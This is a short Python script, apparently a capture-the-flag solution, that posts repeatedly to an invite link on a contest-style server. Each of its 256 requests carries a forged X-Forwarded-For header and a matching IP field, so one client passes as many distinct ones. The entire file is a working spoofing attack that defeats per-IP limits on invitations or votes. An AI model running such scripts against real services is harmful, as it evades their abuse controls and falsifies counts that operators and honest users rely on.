import time

import requests

for i in range(1, 257, 1):
    ip = str(i)+'.65.147.247'
    url = "http://202.38.93.111:10888/invite/f1d80aee-9a27-4ea9-9a8f-cacf046b1afe"
    headers = {
        'Host': '202.38.93.111:10888',
        'Content-Length': '3',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'http://202.38.93.111:10888',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Referer': 'http://202.38.93.111:10888/invite/f1d80aee-9a27-4ea9-9a8f-cacf046b1afe',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
        'X-Forwarded-For': ip,
    }
    data = {'ip': ip}
    r = requests.post(url=url, data=data, headers=headers)
    time.sleep(1)
    print(r.text)
